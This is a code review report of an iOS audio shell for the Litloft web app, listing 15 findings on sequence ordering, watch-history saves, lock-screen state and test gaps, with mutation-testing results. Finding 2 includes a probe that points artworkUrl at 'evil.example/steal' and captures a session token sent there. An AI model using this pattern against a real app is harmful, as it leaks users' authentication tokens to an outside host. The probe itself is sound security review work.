# iOS shell Phase 2a — round 1

- Reviewed SHA: `ae3619dad2aeb63bba5c8e31d25d6e2852d8460d` (range `origin/develop..ae3619da`, seven commits)
- Invariants: `docs/superpowers/specs/2026-09-16-ios-native-audio-invariants.md` (1–10), plus spec §6 (1–6)
- Baseline before mutating: `xcodebuild test` → **TEST SUCCEEDED** (~26 s);
  `vitest run src/lib/__tests__ src/components/__tests__/AudioPlayer.test.tsx` → 926 passed / 68 files.
- Working tree: only `addons/knowledge` modified (pre-existing, not touched).
- Reproductions that needed a probe were written as a temporary test file, run, and deleted.
  Nothing was fixed.

Findings are ordered by what a user can hit.

---

## 1. A lock-screen press queued behind a web command moves `appliedSeq` backwards

`[introduced]` — `ios/Litloft/Media/MediaPlayer.swift:71-73`, `:76-84`, `:110`

**Invariant broken:** 4 (`appliedSeq` never goes backwards), and through it 5.

`applyFromRemote` reads `appliedSeq` **when it is called**, but the command it builds is
applied **later**, at the end of the serial chain:

```swift
func applyFromRemote(_ command: MediaCommand) -> Task<Void, Never> {
    apply(command, seq: appliedSeq)   // value captured now
}
...
appliedSeq = seq                      // assigned when the chain reaches it
```

If any web command is still queued when the press arrives, the remote command is stamped
with the value from before that command. The chain applies the web command (raising
`appliedSeq`), then applies the remote one and sets `appliedSeq` back to the old value.
Every tick after that, including every periodic tick, carries the lower number.

**Probe (a temporary test, since deleted), measured:**

| sequence | ticks' `appliedSeq` |
|---|---|
| `pause`#4 → `load`#5 → `seek`#6 → `applyFromRemote(.pause)` (all queued before the load finished) | `[4, 5, 5, 6, 4]` |
| `pause`#1 → `seek`#2 queued → `applyFromRemote(.play)` right after | `[1, 1, 2, 1]` |

The second case needs no slow load. A synchronous command still reaches the chain one
main-actor hop later, so the window is open for any press that lands between the web
posting a command and the chain running it.

**Failure scenario.** The viewer drags the in-app seek bar to 5:00 (`seek`#12) and taps
pause on the lock screen or AirPods in the same moment. The shell applies #12, then the pause
with seq 11. The web's `pendingSeek` is `{seq: 12, time: 300}`. Every later tick carries
`appliedSeq: 11 < 12`, so `MediaChannel.apply` treats each one as stale and pins `time` to
300 **for the rest of the file**. The viewer presses play. The audio plays, but the scrub bar and
elapsed time stay at 5:00, and `usePlaybackProgress` never sees the position move, so it
saves nothing. This lasts until the web sends another seek. The load case is wider: it spans the
`allCookies()` await, which is the moment a viewer who just opened a file is most likely to
press play on the headphones.

The existing test `remoteDoesNotAdvanceTheSequence` passes because every command in it is
awaited before the next is issued, so nothing is queued when the remote press is captured.

**Mutation:** none needed; the probe above is the reproduction. For completeness:
`applyFromRemote` → `apply(command, seq: appliedSeq + 1)` `want=kill` → **killed**
(`remoteDoesNotAdvanceTheSequence`). The test holds the "don't advance" half but not the
"don't go back" half.

---

## 2. The artwork request carries the session cookie to whatever host `artworkUrl` names

`[introduced]` — `ios/Litloft/Media/MediaPlayer.swift:118,129`, `ios/Litloft/Media/NowPlaying.swift:121-126`

**Invariant broken:** spec §6 item 6 (the auth cookie is not sent to any host other than the
stream URL's).

`load` picks cookies for **`source.url`'s** host, then passes that same set to
`showArtwork(from: source.artworkURL, cookies:)`. `fetchImage` sets them as a `Cookie`
header on a request to the **artwork** URL, with no host check. `route` validates only the
sender (`MessageOrigin`), never the URLs in the payload, and neither URL is compared to the
configured server anywhere.

**Probe, measured:** a `FakeCookieJar` holding `access_token=SECRET` for `litloft.local`,
then `media.load` with `url: http://litloft.local:3000/...` and
`artworkUrl: http://evil.example/steal`. A registered `URLProtocol` recorded
`[("evil.example", "access_token=SECRET")]`.

**Failure scenario.** Anything that can get a string of its choosing into `artworkUrl` from the
trusted main frame can take the viewer's drive-unlock JWT. That includes script running in the
Litloft origin, and any future caller that builds `artworkUrl` from file or addon metadata
rather than from `window.location.origin`. The JWT
is not revoked by `/api/auth/lock` (it only deletes the cookie), so it stays usable. Today
`useShellAudio` builds both URLs from `window.location.origin`, so the current web code does
not trigger this. The shell, though, is the layer that is supposed to hold the boundary
(`MessageOrigin` exists for that reason), and it does not hold it for the payload.

Related, `[pre-existing]` but made newly load-bearing here:
`SessionCookies.matches(domain:host:)` treats every cookie as a domain cookie
(`host.hasSuffix("." + domain)`), so a host-only `access_token` for `litloft.local` is
also selected for `media.load` URLs on `x.litloft.local`. Until this change the function was
only used to *delete* cookies. Now it decides what is *sent*.

**Mutation:** in `load`, pass all cookies unfiltered
(`SessionCookies.session(in:host:)` → `await jar.allCookies()`) `want=kill` → see the mutation
table. No test exercises the cookie set `load` builds.

---

## 3. A tick describing the previous file is applied to the next one: a second "ended", and a completed watch recorded for a file never played

`[introduced]` — `frontend/src/lib/nativeMedia.ts:63-67,111-132`; `ios/Litloft/Media/MediaPlayer.swift:57-65,163-167`

**Invariants broken:** design-decisions "Watch history" (*never fabricate a completed
state*), spec §6 item 1/2 in spirit. Invariant 5 is also bypassed for every field except `time`.

`MediaChannel.apply` gates only `time` on `appliedSeq`. `load()` resets the shadow but
records no "load seq" below which a tick belongs to the previous file. `useShellAudio` creates
a **new** channel per file, and it subscribes before the shell has applied the old channel's
`unload` or the new `load`. So a tick emitted for file A and still in flight lands on B's channel
and replaces B's whole shadow, including `ended` and `duration`.

The shell really does send such a tick. **Probe, measured on a 0.7 s local file:** after the item
ends, `didBecomeActiveNotification` emits a second tick with `ended: true` and the same
`appliedSeq` (`endedTicksBefore=1 … count=2`). `ended` is cleared only by `load`, `seek` and
`unload`, so every foreground return re-sends it. A file that ends while the app is off screen
has two such ticks queued for the web view when it comes back: the one from `finish()` and the
one from `didBecomeActive`.

**Probe at the `AudioPlayer` level (temporary vitest file, since deleted), measured:**
render file A with `onEnded`. Deliver `{time:180, duration:180, ended:true, appliedSeq: seqA}`,
then `rerender` with file B (as an autoplay advance does). Deliver the same tick again.

```
onEnded calls: 2
saveWatchProgress calls: [["A",180,180],["B",180,180]]
```

**Failure scenario.** Autoplay is on. A track ends while the phone is locked. The viewer unlocks.
The first queued tick fires `onEnded`, and the page advances to B. The second tick reaches B's
channel. `justEnded` is true again, so `handleEnded` runs `notifyEnded` against B's controller,
whose shadow now holds A's `time`/`duration`. It **writes B as watched to 180/180**, then
advances again to C. B never played. It is now marked finished, which takes it out of
continue-watching, and the viewer never heard it.

The existing test `"says it again if a new file also runs out"` **holds the defect**: its second
tick carries `appliedSeq: 0`, below the load's seq, so it is by construction a reading from
before the load. The test asserts that such a tick fires `onEnded`.

**Mutations:**
- `useShellAudio` deps `[file.id, title, artist]` → `[title, artist]` `want=kill` → see table
  (no test re-renders with a different file).
- `nativeMedia.load()` drop `this.pendingSeek = null` `want=kill` → see table.

---

## 4. In the shell, leaving the page no longer saves the position: `unload` zeroes the shadow before the teardown write reads it

`[introduced]` — `frontend/src/hooks/useShellAudio.ts:49-54`, `frontend/src/lib/nativeMedia.ts:94-98`, `frontend/src/components/AudioPlayer.tsx:33,59`

**Invariant broken:** 8 in substance (history stays on the web's single path, *as before*;
spec §4.2 "POST は今まで通り"). The teardown save is part of that path, and it no longer
fires.

React runs a component's effect cleanups in declaration order. `useShellAudio` is called on
line 33, `usePlaybackProgress` on line 59. On unmount or file change, `useShellAudio`'s cleanup
runs `channel.unload()` first, which sets the shadow to `INITIAL` (`time: 0, duration: 0`). Then
`usePlaybackProgress`'s cleanup reads `mc.getCurrentTime()` / `mc.getDuration()`, gets zeros,
fails `usable()`, and writes nothing.

**Probe, measured:** in the shell, deliver a tick `time: 2, duration: 180`, let the resume read
settle, deliver `time: 42`, then `unmount()`. Result: `saveWatchProgress` calls `[]`. The same
probe with `channel.unload()` commented out of the cleanup: `[["A",42,180]]`. The browser-path
twin (`"saves the position when the listener navigates away"`) passes, so this is shell-only.

**Failure scenario.** A viewer listens to a podcast, pauses 4.9 s after the last periodic save
(`SAVE_INTERVAL` = 5 s), and taps back to the folder or on to the next file. Those 4.9 s are
never written. Paused, the periodic save never catches up, so the stored resume point stays
behind where the viewer stopped. Across a session of short listens and file hops, each hop
loses its tail. Nothing in the suite covers the shell teardown.

**Mutation:** the diagnostic above (remove `channel.unload()`) turns the save back on. That
same mutation is **killed** by `"gives the file back when it goes away"`, so the two effects
cannot both be satisfied by the current ordering.

---

## 5. The shell reports a seek as applied before the player's position has moved, so the hold is released onto the old position

`[introduced]` — `ios/Litloft/Media/MediaPlayer.swift:98-99,110-112,181-190`; consumed at `frontend/src/lib/nativeMedia.ts:115,122`

**Invariant broken:** 5 in effect. The web releases the hold exactly as written, but the
reading that releases it still carries the pre-seek position. The shell's documented meaning
of `appliedSeq` ("a reading taken after a command") does not hold for `seek`.

`perform(.seek)` calls `player.seek(...)`, which is asynchronous, then sets `appliedSeq = seq`
and calls `emitTick()` straight away. That tick reads `player.currentTime()`, which has not
moved yet.

**Probe, measured** (10.7 s local file, loaded and paused at 0, then `seek(7)` as seq 3):
first tick with `appliedSeq == 3` → `time: 0.0`. 300 ms later → `time: 7.0`.

A local file is the fastest case. Over HTTP the gap lasts as long as the Range request takes.

**Failure scenario.**
- The viewer drags the in-app bar from 0:02 to 2:00. The web holds 120. The seq-N tick
  arrives with `time: 2`, `appliedSeq: N`, is judged fresh, and the thumb **jumps back to 0:02**
  until the completion-handler tick brings 120. §4.1 describes this exact flicker as the one
  the design exists to prevent.
- Resume in the shell. `restoreStored` seeks to the saved 120 s and seeds
  `lastSavedRef = 120`. If a mediaClock poll lands in the gap, it reads `time ≈ 2`, and
  `|2 − 120| ≥ SAVE_INTERVAL` → **`saveWatchProgress(id, 2, duration)` overwrites the stored
  resume point with 2**. The next tick at 120 writes it back. A viewer who leaves inside that
  window (or whose teardown write is lost, finding 4) keeps the 2.

**Mutation:** move `appliedSeq = seq; emitTick()` for `.seek` into the seek completion
handler `want=kill` → not run (that would be a fix). The existing
`everyCommandIsReported` seeks to 0 from 0, so position cannot distinguish before from after.
It holds the order of sequence numbers, not the meaning attached to them.

---

## 6. After a file ends, Play does nothing, and the transport then shows it as playing

`[introduced]` — `ios/Litloft/Media/MediaPlayer.swift:90-95`

`perform(.play)` calls `player.play()` on an item sitting at its end. The browser path
(`<audio controls>`) restarts from zero on play-after-ended (HTML "if playback has ended,
seek to the earliest position"). AVPlayer does not.

**Probe, measured** (0.7 s local file played to its end, then `.play` as seq 3), 300 ms later:
the only seq-3 tick is `(time: 0.698, paused: false, ended: true)`. No further ticks follow.

**Failure scenario.** Autoplay is off (the default). A track finishes. The viewer taps Play in the
in-app transport, or on the lock screen, to hear it again. Nothing plays. The shadow now says
`paused: false`, so `AudioTransport` switches to the **Pause** icon, and `NowPlaying.isPlaying`
becomes true, so the lock-screen toggle routes the next press to *pause*. The viewer has to drag
the bar back to get sound. In a browser the same tap replays the track.

**Mutation:** none meaningful. No Swift test ever reaches the end of an item (see finding 11).

---

## 7. Lock (a full-document navigation) leaves a protected drive's audio playing, and on the lock screen

`[introduced]` — `ios/Litloft/Web/WebView.swift:74-76` (no unload on navigation); trigger `frontend/src/components/Sidebar.tsx:229-232`

**Rules touched:** design-decisions "Access control" (a locked drive is hidden entirely);
invariant 7.

The only thing that unloads the shell is `useShellAudio`'s effect cleanup. React does not run
cleanups when the document is replaced. The Lock button does `await lockApi();
window.location.href = "/"`. That is a document replacement, so no `media.unload` is sent. Nothing
on the Swift side (`didStartProvisionalNavigation`, `didCommit`) unloads the player either.
`AVURLAsset` holds its own copy of `access_token`, and `/api/auth/lock` only deletes the
browser cookie (`backend/app/routers/auth.py:71-80`), so further Range requests keep
authenticating.

**Failure scenario.** A viewer plays a file from a protected drive, then presses Lock (for example
before handing the phone to someone). The page returns to `/` with the drive hidden. The audio
keeps playing. The lock screen and Control Center keep showing the file's title and its
`folder_path` (`useShellAudio` sends `artist: file.folder_path || file.drive`) and artwork, and
they keep offering play/pause/scrub. The web UI no longer has any control that can stop it.
The same holds for a pull-to-refresh or any reload: the shell keeps playing a file no page
knows about.

By reading. Not driven on a device. The two halves (no cleanup on `location.href`, no Swift
unload on navigation) are each visible in the code.

---

## 8. In the shell `notifyReady` is never called, so autoplay starts from zero and then jumps to the resume point

`[introduced]` — `frontend/src/components/AudioPlayer.tsx:64-66,100-108`, `frontend/src/hooks/useShellAudio.ts:45`

`handleLoadedMetadata` → `notifyReady()` is wired only to `<audio onLoadedMetadata>`, which
is not rendered in the shell. `useShellAudio` sends `play` in the same effect as `load`. Resume then
happens only from `usePlaybackProgress`'s tick fallback, after the shell reports a duration
and `getWatchProgress` returns. `notifyReady`'s own doc describes this outcome: "autoplay
begins at zero and the restored position lands a moment later, which the viewer … hears as
the video starting over before jumping".

**Failure scenario.** Autoplay is on. The viewer opens a half-listened audiobook chapter. The
first second or so of the chapter's opening plays, then it jumps to 23:40. It also opens the
window in finding 5, where a pre-seek position can be saved.

No invariant covers this. Filed so the triage can place it.

---

## 9. The lock screen never learns the length of an autoplayed file

`[introduced]` — `ios/Litloft/Media/MediaPlayer.swift:110-112,169-179`; `ios/Litloft/Media/NowPlaying.swift:63-78`

`publishNowPlaying` runs only when a command is applied or the item ends, never on a
periodic tick. At `load` the duration is indefinite, so `IsLiveStream = true` and no
`PlaybackDuration` are published. `play` follows at once, before the asset has a duration.
After that nothing republishes until the viewer issues another command.

**Probe, measured** (local file, `load` then `play`, as autoplay does, then wait until ticks
report `duration: 10.7` and another 500 ms): `nowPlayingInfo` still has `IsLiveStream = true`
and `PlaybackDuration = nil`.

**Failure scenario.** An autoplayed track shows on the lock screen as a live stream: no total
time and no scrubber, so `changePlaybackPositionCommand` cannot be reached. This lasts until the
viewer pauses or seeks from inside the app. The same gap means an interruption (a call) or a
stall that stops the player is never republished. The lock screen keeps extrapolating elapsed
time at rate 1, and the toggle keeps choosing *pause*.

`NowPlayingTests.lengthArrivesLate` checks `NowPlaying.update` in isolation. It does not check
that `MediaPlayer` ever calls it once the length arrives.

---

## 10. The shell's `AudioPlayer` wiring has no test that it plays, saves or advances

`[introduced]` — `frontend/src/components/AudioPlayer.tsx:29-37,73,77-78`; tests `frontend/src/components/__tests__/AudioPlayer.test.tsx:152-212`

**Invariants left unheld:** 8 and 10, plus the watch-history rule the brief names.

The five shell tests check that no `<audio>` is rendered, the load payload, that a Play
button *exists*, autoplay on/off, and `unload` on unmount. Every one of these mutations
survives:

| mutation | what a viewer gets | result |
|---|---|---|
| F40 `const mc = elementMc` (the shell controller is never used) | a transport that is permanently disabled, no progress saved, `onMediaController(null)` for the page | **live** |
| F36 drop `channel.onEnded = …` / F42 drop `endedRef.current = handleEnded` | reaching the end writes no final position and never advances | **live** / **live** |
| F41 `if (!mc) return;` (Media Session set up in the shell too) | two owners of the lock screen (invariant 10) | **live** |
| F35 drop `file.id` from `useShellAudio`'s deps | switching between two files with the same title and folder keeps playing the first one while progress is saved under the second's id | **live** |

"offers a transport of its own" passes under F40 because it asserts presence, and the button
is rendered (disabled) when `mc` is null. In the shell, none of the following is tested:
`notifyEnded` recording the final position (rather than deleting the row), a zero `duration`
producing no write, or the teardown save (finding 4 shows the teardown save is in fact broken).

F41 is hard to kill in jsdom, which has no `navigator.mediaSession`, so `setupMediaSession`
returns early whatever the gate says. Holding invariant 10 needs a stubbed
`navigator.mediaSession`.

---

## 11. `AudioTransport` is untested, its speed label goes stale while paused, and an unfinished drag freezes the position

`[introduced]` — `frontend/src/components/player/AudioTransport.tsx:20-37,51-63,78`

No test renders `AudioTransport`, directly or via `AudioPlayer` beyond a role lookup. Every
mutation survived: F50 (`duration >= 0` → a zero-length slider enabled), F51 (drop
`onPointerUp`, so a touch drag never commits a seek), F52 (drop `disabled`), F53 (constant
aria-label), F54 (rate cycle stuck at 1x), F55 (unclamped value).

**Speed label, probe measured:** in the shell, paused, press "Playback speed". `media.setRate
1.25` is sent, and a tick reports `rate: 1.25`. After 3 s of clock ticks the button still reads
**`1x`**. The label is `mc.getPlaybackRate()` read during render, but the only thing that
re-renders the component is `useMediaClock`, whose snapshot has no rate. A paused player's
snapshot never changes. The viewer taps again, and it jumps to 1.5x. The label updates only once
playback moves the clock.

**Drag, by reading.** `scrubbing` is cleared only in `commit`, which runs on `pointerup` or
`keyup`. There is no `onPointerCancel` or `onBlur`. If iOS cancels the touch partway (the web
view has `allowsBackForwardNavigationGestures = true`, and a horizontal drag near the edge is
the gesture that competes), `scrubbing` stays set. The displayed position then freezes at the
drag value, and no seek is ever sent, until the viewer touches the slider again. Not measured on a
device.

`onKeyUp` commits on any key, including Tab leaving the slider. That issues a seek to the
current position, which re-buffers. Minor.

---

## 12. Saving the title of the file being listened to stops it

`[introduced]` — `frontend/src/hooks/useShellAudio.ts:29-30,55`

The effect that loads and unloads the shell depends on `title` and `artist`
(`file.title || file.filename`, `file.folder_path || file.drive`). The file detail page
replaces `file` after a title save (`useFileDetailData.save` → `setFile(updated)`) or a
rename (`rename` → `setFile(updated)`, and `filename` feeds `title` when there is no title).

**Probe, measured:** render `AudioPlayer` in the shell, then rerender the same `id` with a new
`title`. Messages sent: `["media.unload", "media.load"]`.

**Failure scenario.** A viewer is listening to a recording and fixes its title in the file
detail panel. Playback stops. The file reloads from 0:00 and stays paused (autoplay is off by
default). The seconds since the last save are lost as well (finding 4). The browser path is
unaffected, because `<audio src>` depends only on `id`. The comment on `endedRef` gives
"a changing handler does not tear the player down" as the goal. The metadata dependencies
do tear it down.

---

## 13. One slow cookie read blocks every later command, including pause from the lock screen

`[introduced]` — `ios/Litloft/Media/MediaPlayer.swift:76-84,115-118`

By reading. Every command waits for the previous one. `load` awaits
`WKHTTPCookieStore.allCookies()`, which has no timeout, so until it returns nothing after it is
applied: not `pause`, not `unload`, not a lock-screen press. Nothing reports the backlog to the
web. The shadow shows the optimistic `paused` from `MediaChannel.pause()`, while the shell is
about to start playing (`play` is queued ahead of `pause`). Once the read returns, the queued
commands run in order, so the net effect is correct, only late. If the read never returns, the
shell ignores the viewer from then on.

Not measured: on the simulator the read returns quickly. Filed because the brief asks what
happens when that read is slow, and the answer is head-of-line blocking with no bound.

---

## 14. Tearing down the player without `unload` leaves the lock screen, the remote targets and the audio session behind

`[introduced]` — `ios/Litloft/Media/MediaPlayer.swift:47-51`; reachable through `ios/Litloft/RootView.swift:9-14` (`.id(serverURL)`)

**Invariant touched:** 7.

`isolated deinit` removes the two notification observers and nothing else. It does not remove
the periodic time observer, clear `MPNowPlayingInfoCenter`, release the remote command
targets, or release the audio session. The coordinator, and with it the player, goes away when
`WebShell` is replaced. That happens through "Change server" on `ConnectionErrorView`, which
appears on any failed navigation, including while audio is playing.

**Failure scenario (by reading).** Audio is playing. The viewer follows a link, and the server
does not answer. The error view appears. The viewer taps *Change server*. The player is
deallocated and the sound stops. Control Center still shows the previous server's file with
play/pause buttons that do nothing (the targets' `[weak self]` resolves to nil and they return
`.success`). The app also keeps the playback audio session active, which is what invariant 7 is
there to prevent.

---

## 15. Swift tests that pass without their subject, and a lock-screen suite that is not isolated

`[introduced]` — `ios/LitloftTests/MediaPlayerTests.swift`, `ios/LitloftTests/NowPlayingTests.swift`

- **`commandsApplyInOrder` does not hold the ordering.** Mutation S2 removes the chain
  (`await previous?.value`). This test stays green: it awaits only the *last* task, and without
  the chain that task (`play`) finishes first. The slow `load` tick arrives after the assertions
  have run. The mutation is killed only by accident, because `everyCommandIsReported` notices
  that seq 1 is missing.
- **`playerTakesAndReleasesTheTransport` asserts a default.** It checks
  `playCommand.isEnabled` after a `.play` with **nothing loaded**, which is true before any
  target is added. S7 (drop `nowPlaying.takeCommands()` from `load`) is **live**. So is S24
  (leave `changePlaybackPositionCommand`'s target registered after unload).
- **No test reaches the end of an item.** S14 (`finish` never sets `ended`), S15 (`seek`
  keeps `ended`) and S16 (`load` keeps `ended`) are all **live**. The flag that drives
  `onEnded` → `notifyEnded` → the final-position write is not held on the Swift side.
  A 0.7 s local fixture reaches the end in the simulator in under a second (used for the probes
  in findings 3 and 6).
- **Rate and play state are not held.** S11 (report `player.rate` instead of `defaultRate`, so a
  paused player reports rate 0 to the web), S12 (`setRate` while paused starts playback), S19
  (lock-screen `isPlaying` inverted) and S38 (`unload` without `pause`) are all **live**.
- **Security-relevant load behaviour is not held.** S18 (send *every* cookie in the jar with the
  stream), S21 (never clear the previous file's artwork) and S26 (accept a non-200 artwork
  response) are **live**. See finding 2.
- **The lock-screen suite is not isolated.** `NowPlayingTests.swift` says everything touching
  `MPNowPlayingInfoCenter` lives in the serialized `LockScreenTests`. But `MediaPlayerTests`
  (not serialized against it) loads files, which publishes to the same center, and five of its
  tests never unload. `playerTakesAndReleasesTheTransport` failed under S1 and S28, neither of
  which touches the lock screen. That is the same shape as a flake: its `nowPlayingInfo == nil`
  assertion races a parallel `load`.

---

## Mutation table

Swift: full `xcodebuild test` per mutation. Web: `vitest run src/lib/__tests__` plus
`AudioPlayer`, `FilePreview` and `primaryMetaRendering` tests. The tree was restored after each.

| id | mutation | want | result |
|---|---|---|---|
| S1 | `applyFromRemote` stamps `appliedSeq + 1` | kill | killed (`remoteDoesNotAdvanceTheSequence`) |
| S2 | drop `await previous?.value` | kill | killed only by `everyCommandIsReported` (15) |
| S3 | drop the `play` no-item guard | kill | killed |
| S4 | `load` does not take the session | kill | killed |
| S5 | `unload` does not release the session | kill | killed |
| S6 | `unload` does not clear the lock screen | kill | killed |
| S7 | `load` does not take commands | kill | **live** (15) |
| S9 | `seconds()` passes NaN through | kill | killed |
| S10 | `paused` inverted | kill | killed |
| S11 | tick reports `rate` not `defaultRate` | kill | **live** (15) |
| S12 | `setRate` always sets `player.rate` | kill | **live** (15) |
| S13 | foreground observer emits nothing | kill | killed |
| S14 | `finish` does not set `ended` | kill | **live** (15) |
| S15 | `seek` does not clear `ended` | kill | **live** (15) |
| S16 | `load` does not clear `ended` | kill | **live** (15) |
| S17 | `appliedSeq` assigned after the tick | kill | killed |
| S18 | all cookies sent with the stream | kill | **live** (2, 15) |
| S19 | lock-screen `isPlaying` inverted | kill | **live** (15) |
| S21 | artwork not cleared on load | kill | **live** (15) |
| S22 | `IsLiveStream` for `duration < 0` only | kill | killed |
| S24 | position target kept after release | kill | **live** (15) |
| S25 | toggle inverted | kill | killed |
| S26 | artwork status not checked | kill | **live** (15) |
| S27 | `clear` keeps `nowPlayingInfo` | kill | killed |
| S28 | `isMainFrame` ignored | kill | killed |
| S29 | host not compared | kill | killed |
| S30 | https:443 not folded | kill | killed |
| S31 | `route` skips the origin check | kill | killed |
| S32 | non-finite seek accepted | kill | killed |
| S33 | rate 0 accepted | kill | killed |
| S34 | volume not clamped | kill | killed |
| S35 | title optional | kill | killed |
| S36 | artwork URL dropped | kill | killed |
| S38 | `unload` without `pause` | kill | **live** (15) |
| F1 | stale is `<=` | kill | killed |
| F2 | stale always false | kill | killed |
| F3 | `ended` fires on every ended tick | kill | killed |
| F4 | `load` keeps the shadow | kill | killed |
| F5 | `load` keeps `pendingSeek` | kill | **live** (low: `useShellAudio` never reuses a channel) |
| F6 | `unload` keeps the shadow | kill | killed |
| F7 | `seek` keeps `ended` | kill | **live** (low: the next tick overwrites `ended`) |
| F9 | `setRate` optimistic | kill | killed |
| F10 | `dispose` keeps listening | kill | killed |
| F11 | stale tick's time used | kill | killed |
| F12 | duration not taken from tick | kill | killed |
| F13 | channel created outside the shell | kill | killed |
| F14 | seek not recorded as pending | kill | killed |
| F21 | buffered fraction unclamped | kill | killed |
| F22 | volume unclamped | kill | killed |
| F23 | manual volume keeps the mute memory | kill | killed |
| F24 | buffered with unknown length | kill | killed |
| F25 | `isMuted` always false | kill | killed |
| F26 | `togglePlay` always plays | kill | killed |
| F30 | autoplay never plays | kill | killed |
| F31 | autoplay inverted | kill | killed |
| F32 | cleanup does not unload | kill | killed |
| F33 | cleanup does not dispose | kill | **live** (low: listener and receiver leak) |
| F34 | stream URL relative | kill | killed |
| F35 | `file.id` not a dependency | kill | **live** (10) |
| F36 | `channel.onEnded` not wired | kill | **live** (10) |
| F38 | artwork URL relative | kill | killed |
| F39 | cleanup keeps `mc` | kill | **live** (low) |
| F40 | shell controller never used | kill | **live** (10) |
| F41 | Media Session set up in the shell | kill | **live** (10) |
| F42 | `endedRef` not assigned | kill | **live** (10) |
| F43 | `<audio>` also rendered in the shell | kill | killed |
| F44 | autoplay forced off | kill | killed |
| F45 | shell branch never taken | kill | killed |
| F50–F55 | `AudioTransport`: seekable at 0, no pointer-up commit, never disabled, fixed label, fixed rate, unclamped value | kill | **all live** (11) |

## Survivors that were meant to survive (`want=live`)

| id | mutation | why it is fine |
|---|---|---|
| S8 | `unload` does not `stopTicking()` | with no item, the periodic observer never fires |
| S20 | buffered from the first range, not the last | the value is only a buffering hint; no consumer in the shell path uses it |
| S23 | `takeCommands` without its guard | duplicate targets only repeat an idempotent play or pause; `load` is the sole caller |
| S37 | `userContentController` drops media commands | the handler cannot be driven without a real `WKScriptMessage`; `route` is the tested unit (settled in Phase 1) |
| F8 | `play()` not optimistic | the next tick sets `paused` anyway |
| F20 | unmute falls back to 0 instead of 1 | only reachable with no remembered volume, which `toggleMute` never produces |
| F37 | cleanup leaves `channel.onEnded` set | the channel is disposed in the same cleanup, so it receives nothing more |

## Checked, not a finding

- Invariant 1: in a browser, `createMediaChannel` returns null and `postToShell` does nothing
  (F13 killed).
- Invariant 2: no `<audio>` in the shell (F43/F45 killed).
- Invariant 3: getters read a frozen `INITIAL` before any tick and never throw.
- Invariant 6: the origin check holds (S28–S31 killed). The *payload* is not checked (finding 2).
- Invariant 8: nothing in Swift calls `/progress`. `grep -rn progress ios/Litloft` finds
  nothing.
- Invariant 9: `seconds()` folds NaN and indefinite to 0 (S9 killed). `notifyEnded` bails on an
  unusable duration, so a 0 duration does not become a completion.
- Retain graph: player ↔ bridge closures are both weak, and `NowPlaying` → player and command
  targets → `NowPlaying` are weak. No cycle found.
- `MainActor.assumeIsolated` in the seek completion handler did not trap on the simulator,
  either synchronously (no item) or asynchronously (local file). The queue AVFoundation uses
  for that callback is not documented, and remote assets were not measured.
- Accepted items from the brief (video not native, `_blank` links, long-press selection, no iOS
  CI, on-device R-5 for audio): not re-derived.
- `swiftlint lint --quiet` was not run; nothing above rests on it.

## Trajectory

This is round 1, so there are no earlier fix diffs to compare. What one snapshot does show:
findings 1, 3 and 5 are three instances of one premise that does not hold. The premise is that
"a tick whose `appliedSeq` is at or above a command's seq was read after that command took
effect".

- **Lock-screen press (finding 1).** The press is stamped with the `appliedSeq` read when it
  is enqueued, not when it runs. A higher web seq applied in between is followed by a lower
  one, so later ticks are ranked below a seek that has already landed.
- **Load (finding 3).** `load` records no seq at all. Any tick, whatever its `appliedSeq`,
  overwrites the new file's shadow, including one that describes the previous file.
- **Seek (finding 5).** `appliedSeq` is raised when `player.seek` is *issued*. The tick emitted
  at that moment carries the pre-seek position, so the web releases its hold onto a reading
  from before the seek took effect.

The web side gates only `time` on `appliedSeq`, and only for a seek. The shell side assigns
`appliedSeq` at a point that does not mark "effect observable" for remote commands or seeks.
Each of the three has its own mechanism, and the code handles none of them.

TOTAL: 15 findings
